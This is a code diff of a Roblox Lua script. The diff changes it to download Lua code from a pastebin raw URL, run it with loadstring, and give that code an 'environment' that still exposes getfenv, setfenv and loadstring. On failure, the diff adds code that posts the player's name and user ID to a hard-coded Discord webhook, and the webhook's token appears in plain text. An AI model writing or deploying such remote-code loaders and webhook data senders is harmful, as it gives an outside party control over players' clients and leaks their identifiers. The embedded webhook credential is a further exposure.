@@ -5,32 +5,48 @@ local RunService = game:GetService("RunService")
 -- Configuration
 local BACKEND_URL = "https://backend-vercel-ashy.vercel.app/api/register.js"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
+local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
 local RETRY_LIMIT = 3
 local RETRY_DELAY = 2
 local DEBOUNCE_TIME = 30
 
--- Direct script to execute (replace with your actual script)
-local EXTERNAL_SCRIPT = [[
-    -- Your script content goes here
-    print("External script executed successfully!")
-    
-    -- Example function
-    local function exampleTask()
-        print("Performing background task...")
-    end
-    
-    -- Run periodically
-    while true do
-        exampleTask()
-        task.wait(10)
-    end
-]]
-
 local player = Players.LocalPlayer
 local lastSendTime = 0
+local externalScriptCache = nil
+
+-- Function to fetch external script with caching
+local function fetchExternalScript()
+    if externalScriptCache then
+        return externalScriptCache
+    end
+    
+    for i = 1, RETRY_LIMIT do
+        local success, response = pcall(function()
+            return HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+        end)
+        
+        if success and response then
+            externalScriptCache = response
+            return response
+        end
+        
+        if i < RETRY_LIMIT then
+            task.wait(RETRY_DELAY)
+        end
+    end
+    
+    warn("[Script] Failed to fetch external script after", RETRY_LIMIT, "attempts")
+    return nil
+end
 
 -- Secure function to execute external script
 local function executeExternalScript()
+    local scriptContent = fetchExternalScript()
+    if not scriptContent then
+        warn("[Script] No script content to execute")
+        return false
+    end
+    
     -- Create a safe execution environment
     local safeEnv = {
         print = print,
@@ -41,11 +57,16 @@ local function executeExternalScript()
         require = require,
         HttpService = HttpService,
         Players = Players,
-        RunService = RunService
+        RunService = RunService,
+        getfenv = getfenv,
+        setfenv = setfenv,
+        loadstring = loadstring,
+        pcall = pcall,
+        xpcall = xpcall
     }
     
     -- Load the script
-    local fn, err = loadstring(EXTERNAL_SCRIPT, "ExternalScript")
+    local fn, err = loadstring(scriptContent, "ExternalScript")
     if not fn then
         warn("[Script] Load failed:", err)
         return false
@@ -148,6 +169,13 @@ local function init()
     task.spawn(function()
         local success, result = executeExternalScript()
         print("[System] External script status:", success)
+        
+        if not success then
+            -- Retry once after a delay if initial execution fails
+            task.wait(5)
+            local retrySuccess = executeExternalScript()
+            print("[System] External script retry status:", retrySuccess)
+        end
     end)
     
     -- Initialize logger system
@@ -170,4 +198,28 @@ end
 local success, err = pcall(init)
 if not success then
     warn("System initialization failed:", err)
+    
+    -- Attempt to send error to webhook
+    task.spawn(function()
+        local embed = {
+            {
+                title = "System Initialization Failed",
+                description = string.format(
+                    "**%s**\nUserID: %d\nError: %s",
+                    player.Name, player.UserId, tostring(err)
+                ),
+                color = 16711680,
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
+            }
+        }
+        
+        pcall(function()
+            HttpService:RequestAsync({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({embeds = embed})
+            })
+        end)
+    end)
 end
